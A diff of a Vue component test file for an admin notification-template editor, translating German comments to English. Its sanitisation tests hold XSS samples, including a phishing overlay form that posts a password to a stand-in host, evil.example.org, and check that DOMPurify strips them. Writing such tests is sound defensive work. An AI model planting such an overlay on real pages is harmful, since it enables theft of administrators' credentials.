@@ -1,6 +1,6 @@
-// happy-dom (das globale Test-Environment dieses Projekts) implementiert das
-// DOM-API zu unvollständig für DOMPurify - Payloads werden
-// nicht zuverlässig entfernt. Nur diese Datei läuft deshalb unter jsdom.
+// happy-dom (the global test environment of this project) implements the
+// DOM API too incompletely for DOMPurify - payloads are not
+// removed reliably. Only this file therefore runs under jsdom.
 // @vitest-environment jsdom
 import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest'
 import { mount, flushPromises } from '@vue/test-utils'
@@ -12,10 +12,10 @@ import AdminNotificationTemplates from './AdminNotificationTemplates.vue'
 import { axe } from '../../test-support/axe'
 import { stubConfirm } from '../../test-support/confirm'
 
-// previewBody kommt vom Backend-Preview-Endpoint (admin-editierbares
-// BodyHTML mit Go-Template-Platzhaltern) und wird per v-html gerendert. Diese
-// Tests decken ab, dass ein XSS-Payload im Preview-HTML vor dem Rendern per
-// DOMPurify entfernt wird, während harmloses Markup erhalten bleibt.
+// previewBody comes from the backend preview endpoint (admin-editable
+// BodyHTML with Go template placeholders) and is rendered via v-html. These
+// tests cover that an XSS payload in the preview HTML is removed by
+// DOMPurify before rendering, while harmless markup is kept.
 
 function jsonResponse(body, status = 200) {
   return { ok: status < 400, status, json: async () => body }
@@ -78,7 +78,7 @@ describe('AdminNotificationTemplates', () => {
     vi.restoreAllMocks()
   })
 
-  // Richtung C: Editor und Vorschau stehen in Karten mit Kartenkopf.
+  // Direction C: editor and preview sit in cards with a card header.
   it('zeigt den Editor in einer Karte mit Kopf und Hinweis, ob eine eigene Vorlage aktiv ist', async () => {
     const { wrapper } = await mountView()
     expect(wrapper.find('.comp-card__title').text()).toBe('Vorlage bearbeiten')
@@ -89,8 +89,8 @@ describe('AdminNotificationTemplates', () => {
     expect(custom.find('.comp-card__head .tag-pill--accent').text()).toBe('Eigene Vorlage')
   })
 
-  // Die drei Auswahlfelder (Typ, Zielgruppe, Sprache) schreiben ihren
-  // Wert in den Zustand zurück und zeigen dann die passende eigene Vorlage.
+  // The three selects (kind, audience, language) write their value
+  // back into the state and then show the matching custom template.
   it('wählt über die drei Auswahlfelder Typ, Zielgruppe und Sprache die passende Vorlage', async () => {
     const { wrapper } = await mountView({ fetchImpl: makeFetchRouter({ templates: [customTemplate] }) })
     const accent = () => wrapper.find('.comp-card__head .tag-pill--accent').exists()
@@ -118,8 +118,8 @@ describe('AdminNotificationTemplates', () => {
     expect(wrapper.find('section.comp-card').classes()).toContain('comp-card--visible')
   })
 
-  // Regression 2026-10-29: Nach „Vorschau“ blieb die Ansicht oben bei der
-  // Erfolgsmeldung, die Vorschau unter dem Formular musste man suchen.
+  // Regression 2026-10-29: after "Preview" the view stayed at the top with the
+  // success message; one had to search for the preview below the form.
   it('springt nach der Vorschau zur Vorschau und setzt den Fokus auf deren Überschrift', async () => {
     const scrollSpy = vi.fn()
     const orig = Element.prototype.scrollIntoView
@@ -197,8 +197,8 @@ describe('AdminNotificationTemplates', () => {
     expect(window.__xss).toBeUndefined()
   })
 
-  // Eine Vorlage mit Formular, Eingabefeld und Bild darf in der Vorschau nicht
-  // als Phishing-Maske für andere Admins erscheinen.
+  // A template with a form, an input field and an image must not appear in the
+  // preview as a phishing mask for other admins.
   it('zeigt Formulare, Eingabefelder, Bilder und Style-Blöcke aus der Vorlage nicht in der Vorschau', async () => {
     const payload = '<style>.ph{position:fixed;inset:0;background:#fff;z-index:99999}</style>' +
       '<form class="ph" action="https://evil.example.org/collect" method="post">Sitzung abgelaufen - bitte Passwort eingeben' +
@@ -229,9 +229,9 @@ describe('AdminNotificationTemplates', () => {
     expect(wrapper.vm.sanitizedPreviewBody).toBe('<p>Harmloser Text</p>')
   })
 
-  // Laden -> Fehlerfall -> Speichern/Zurücksetzen/Vorschau werden
-  // ausdrücklich per flushPromises abgewartet, damit die Coverage nicht vom
-  // Timing abhängt.
+  // Loading -> error case -> saving/resetting/preview are explicitly
+  // awaited via flushPromises, so that coverage does not depend on
+  // timing.
   it('füllt den Editor aus der vorhandenen Vorlage und zeigt den Hinweis auf die eigene Vorlage', async () => {
     const { wrapper } = await mountView({ fetchImpl: makeFetchRouter({ templates: [customTemplate] }) })
 
@@ -335,8 +335,8 @@ describe('AdminNotificationTemplates', () => {
     expect(wrapper.vm.isPreviewing).toBe(false)
   })
 
-  // Die Bestätigungsmail des Double-Opt-in ist als eigener Kind
-  // editierbar und bringt den Platzhalter {{.ConfirmURL}} mit.
+  // The double opt-in confirmation mail is editable as a kind of its
+  // own and comes with the {{.ConfirmURL}} placeholder.
   it('bietet die Abonnement-Bestätigungsmail als Kind und den ConfirmURL-Platzhalter an', async () => {
     const { wrapper } = await mountView()
 
@@ -344,8 +344,8 @@ describe('AdminNotificationTemplates', () => {
     expect(wrapper.vm.placeholders).toContainEqual({ name: 'ConfirmURL', key: '{{.ConfirmURL}}', desc: 'Bestätigungslink des Abonnements (nur Abonnement-Bestätigung)' })
   })
 
-  // Die sechs Ereignisse zu externen Meldungen und die
-  // Platzhalter SourceName/SourceURL waren im Backend gültig, im Editor nicht wählbar.
+  // The six events about external reports and the placeholders
+  // SourceName/SourceURL were valid in the backend but not selectable in the editor.
   it('bietet die Ereignisse externer Meldungen und die Quellen-Platzhalter an und stellt die Zielgruppe um', async () => {
     const { wrapper } = await mountView()
 
@@ -417,15 +417,15 @@ describe('AdminNotificationTemplates', () => {
   })
 })
 
-// Platzhalter per Klick einfügen, Autovervollständigung bei `{`
-// und die native Pflichtfeld-Meldung „Fülle dieses Feld aus.“.
+// Inserting placeholders by click, autocompletion on `{`
+// and the native required-field message "Please fill out this field.".
 describe('AdminNotificationTemplates – Platzhalter', () => {
   beforeEach(() => {
     useAuth().logout()
     useTenant().setActiveTenant(null)
     i18n.global.locale.value = 'de'
-    // jsdom kennt kein scrollIntoView; die Vorschlagsliste ruft es für den
-    // aktiven Eintrag auf.
+    // jsdom has no scrollIntoView; the suggestion list calls it for the
+    // active entry.
     Element.prototype.scrollIntoView = vi.fn()
   })
 
@@ -439,8 +439,8 @@ describe('AdminNotificationTemplates – Platzhalter', () => {
   const mountAttached = () => mountView({ attachTo: document.body })
   const insertButton = (wrapper, key) => wrapper.find(`button[aria-label="Platzhalter ${key} einfügen"]`)
 
-  // Tippen simulieren: Wert und Cursor setzen, input-Event auslösen (bubbelt
-  // wie im Browser zum Wrapper, der Stub aktualisiert das v-model).
+  // Simulate typing: set value and cursor, fire the input event (bubbles
+  // to the wrapper as in the browser; the stub updates the v-model).
   async function typeInto(field, value, cursor = value.length) {
     field.element.value = value
     field.element.setSelectionRange(cursor, cursor)
@@ -457,7 +457,7 @@ describe('AdminNotificationTemplates – Platzhalter', () => {
     const { wrapper } = await mountView()
     const form = wrapper.find('form.edit-form')
     expect(form.element.noValidate).toBe(true)
-    // Die eigene, übersetzte Meldung greift weiterhin.
+    // The own, translated message still applies.
     await form.trigger('submit.prevent')
     expect(wrapper.find('.alert-warning').text()).toBe('Betreff und Body sind Pflichtfelder.')
   })
@@ -583,7 +583,7 @@ describe('AdminNotificationTemplates – Platzhalter', () => {
     expect(document.activeElement).toBe(textarea.element)
     expect(textarea.element.selectionStart).toBe(15)
 
-    // Auch im Betreff übernimmt ein Klick.
+    // A click also inserts into the subject.
     const input = wrapper.find('input')
     input.element.focus()
     await typeInto(input, '{')
@@ -602,15 +602,15 @@ describe('AdminNotificationTemplates – Platzhalter', () => {
     expect(await axe(wrapper)).toHaveNoViolations()
   })
 
-  // Die Vorschau ist im Backend eine Leseaktion (notification_templates:read); ein
-  // Viewer sah den Knopf trotz 403 beim Laden.
+  // The preview is a read action in the backend (notification_templates:read); a
+  // viewer saw the button despite a 403 on loading.
   it('blendet Speichern und Zurücksetzen ohne notification_templates:update/delete aus, die Vorschau bleibt', async () => {
     useTenant().setMyPages([{ ID: 1, Permissions: 'components:read,incidents:read,notices:read' }])
     const { wrapper } = await mountView({ globalAdmin: false })
     const labels = wrapper.findAll('button').map(b => b.text())
     expect(labels).not.toContain('Speichern')
     expect(labels).not.toContain('Zurücksetzen')
-    // Die Vorschau rendert nur und ist eine Leseaktion, sie bleibt für jeden Leser.
+    // The preview only renders and is a read action; it stays available to every reader.
     expect(labels).toContain('Vorschau')
     useTenant().setMyPages([])
   })
@@ -621,8 +621,8 @@ describe('AdminNotificationTemplates – Platzhalter', () => {
     expect(wrapper.findAll('button').map(b => b.text())).toContain('Vorschau')
     useTenant().setMyPages([])
   })
-  // Nach „Auf Default zurücksetzen“ zeigten die Felder sofort „Pflichtfeld“ (Onyx merkt sich die
-  // Änderung am Feld). Die Felder müssen frisch gemountet werden, damit sie unberührt sind.
+  // After "Reset to default" the fields immediately showed "Required field" (Onyx remembers the
+  // change at the field). The fields must be freshly mounted so that they are pristine.
   it('mountet das Formular nach dem Zurücksetzen auf Default neu, damit die Felder unberührt sind', async () => {
     stubConfirm(true)
     const { wrapper } = await mountView({ fetchImpl: makeFetchRouter({ templates: [customTemplate] }) })
